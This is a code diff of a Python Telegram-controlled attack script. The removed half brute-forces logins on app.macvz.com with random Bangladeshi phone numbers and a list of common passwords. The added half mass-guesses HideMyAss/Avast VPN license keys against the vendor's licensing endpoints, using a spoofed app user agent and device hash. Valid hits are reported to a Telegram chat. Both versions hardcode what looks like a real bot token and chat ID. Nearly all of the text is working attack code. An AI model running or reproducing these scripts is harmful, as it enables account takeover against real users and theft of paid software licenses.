@@ -1,93 +1,135 @@
-from telegram.ext import Application, CommandHandler, ContextTypes
-from telegram import Update
-import hashlib
+import time
 import requests
-import random
+import license_pb2
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# 🛡️ Your Telegram bot token and your own Telegram ID
-TOKEN = '7974281346:AAG8uXYvqW_khgOnwyCTf2J6k9nm2aSLZ4c'
-OWNER_ID = 5509024333  # Replace with your Telegram user ID only
+BOT_TOKEN = '7974281346:AAG8uXYvqW_khgOnwyCTf2J6k9nm2aSLZ4c'
+ADMIN_CHAT_ID = '5509024333'
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-# 📱 Mobile number generation settings
-prefixes = ['88016', '88017', '88018', '88019']
-used_numbers = set()
+user_chat_id = None
+started = False
+offset = 0
+count = 0
+MAX_WORKERS = 20  # number of concurrent requests per batch
+SUCCESS_THRESHOLD = 2  # how many successes needed before next batch
 
-# 🔐 Common Bangladeshi-style password list
-password_list = [
-    '123456', '12345678', '123456789', 'password', 'bangladesh', '112233',
-    '123123', '1971', 'bismillah', '786786', 'abcd1234', 'password1', 'admin',
-    'welcome', '102030', 'qwerty', '123321', '000000'
-]
+def generate_random_license():
+    from random import choices
+    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    seg = lambda: ''.join(choices(chars, k=6))
+    return f"{seg()}-{seg()}-{seg()}"
 
-# 🔁 Generate a unique random mobile number
-def get_unique_mobile():
-    for _ in range(1000):
-        prefix = random.choice(prefixes)
-        suffix = random.randint(10000000, 99999999)
-        mobile = prefix + str(suffix)
-        if mobile not in used_numbers:
-            used_numbers.add(mobile)
-            return mobile
-    return None
+def send_telegram_message(text, chat_id=ADMIN_CHAT_ID):
+    try:
+        requests.post(f"{TELEGRAM_API}/sendMessage", json={
+            "chat_id": chat_id,
+            "text": text,
+            "parse_mode": "Markdown"
+        })
+    except Exception as e:
+        print("Telegram Error:", e)
 
-# 🟢 Start command
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 Bot ready. Use /brute to begin.")
+def poll_telegram():
+    global offset, user_chat_id, started
+    try:
+        res = requests.get(f"{TELEGRAM_API}/getUpdates?offset={offset + 1}").json()
+        for update in res.get("result", []):
+            offset = update["update_id"]
+            msg = update.get("message", {})
+            if msg.get("text") == "/start":
+                user_chat_id = msg["chat"]["id"]
+                send_telegram_message("✅ License checker started.", user_chat_id)
+                if not started:
+                    started = True
+                    threading.Thread(target=cycle_loop, daemon=True).start()
+    except Exception as e:
+        print("Polling Error:", e)
+    time.sleep(2)
+    poll_telegram()
 
-# 🧪 Brute force login testing
-async def brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("⛔ You are not authorized.")
-        return
+def send_analyze_request(key):
+    msg = license_pb2.AnalyzeRequest(
+        license=key,
+        app=license_pb2.AppInfo(
+            package_name='com.hidemyass.hidemyassprovpn',
+            version='5.95.6668'
+        ),
+        device_hash='50D8B4A941C26B89482C94AB324B5A274F9CED6640E53E0EE390E85F0AC208DDACE4D386F87DDA1E',
+        platform=5
+    )
+    try:
+        requests.post(
+            "https://alpha-crap-service.ff.avast.com/v2/analyze",
+            headers={
+                "User-Agent": "HMA_VPN_CONSUMER/5.95.6668 (Android 14)",
+                "Content-Type": "application/octet-stream",
+                "Accept-Encoding": "gzip"
+            },
+            data=msg.SerializeToString(),
+            timeout=5
+        )
+    except Exception as e:
+        print("Analyze Error:", e)
 
-    await update.message.reply_text("🚀 Starting brute force...")
+def send_license_request(key):
+    msg = license_pb2.LicenseRequest(walletKey=key)
+    try:
+        res = requests.post(
+            "https://alpha-lqs-service.ff.avast.com/v2/licenses",
+            headers={
+                "User-Agent": "HMA_VPN_CONSUMER/5.95.6668 (Android 14)",
+                "Content-Type": "application/octet-stream",
+                "Accept-Encoding": "gzip"
+            },
+            data=msg.SerializeToString(),
+            timeout=5
+        )
+        return res.status_code == 200
+    except Exception as e:
+        print("License Request Error:", e)
+        return False
 
-    for _ in range(10):  # Limit mobile numbers tested
-        mobile = get_unique_mobile()
-        if not mobile:
-            await update.message.reply_text("🚫 No more unique numbers.")
-            break
+def process_key(key):
+    send_analyze_request(key)
+    success = send_license_request(key)
+    if success:
+        print(f"✅ VALID LICENSE: {key}")
+        if user_chat_id:
+            send_telegram_message(f"✅ Valid license found:\n`{key}`", user_chat_id)
+    else:
+        print(f"❌ Invalid license: {key}")
+    return success
 
-        for password in password_list:
-            hashed = hashlib.md5(password.encode()).hexdigest()
-            try:
-                response = requests.post("https://app.macvz.com/api/login", json={
-                    "mobile": mobile,
-                    "login_type": 1,
-                    "password": hashed
-                }, timeout=5)
+def cycle_loop():
+    global count
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        while True:
+            batch = []
+            for _ in range(MAX_WORKERS):
+                key = 'JKHV37-FGAHEJ-4FL62W' if count == 19 else generate_random_license()
+                print(f"🚀 [{count + 1}] Trying key: {key}")
+                batch.append(key)
+                count += 1
+            
+            # Submit tasks and wait for them to complete
+            futures = [executor.submit(process_key, key) for key in batch]
+            
+            success_count = 0
+            for future in as_completed(futures):
+                if future.result():
+                    success_count += 1
+                    if success_count >= SUCCESS_THRESHOLD:
+                        break
+            
+            if success_count < SUCCESS_THRESHOLD:
+                print(f"Only {success_count} valid licenses found, retrying batch...")
+            else:
+                print(f"{success_count} valid licenses found, moving to next batch.")
 
-                data = response.json()
-                msg = data.get("contact") or data.get("msg") or data.get("error", "No response")
-
-                # 📺 Log every attempt to terminal
-                print(f"Trying {mobile} - {password} → {msg}")
-
-                if data.get("success"):
-                    result_msg = f"✅ SUCCESS:\n📱 {mobile}\n🔑 {password}\n💬 {msg}"
-                    
-                    # Send success to Telegram
-                    await update.message.reply_text(result_msg)
-
-                    # Print success in terminal
-                    print(result_msg)
-                    return
-            except Exception as e:
-                err_msg = f"⚠️ Error with {mobile} - {password}: {e}"
-                print(err_msg)
-                await update.message.reply_text(err_msg)
-
-    await update.message.reply_text("❌ Brute force complete. No hits.")
-    print("❌ Brute force complete. No hits.")
-
-# 🚀 Main bot launcher
-def main():
-    app = Application.builder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("brute", brute))
-
-    print("✅ Bot is running...")
-    app.run_polling()
+            # Optional: small delay between batches to avoid throttling
+            time.sleep(0.5)
 
 if __name__ == "__main__":
-    main()
+    poll_telegram()
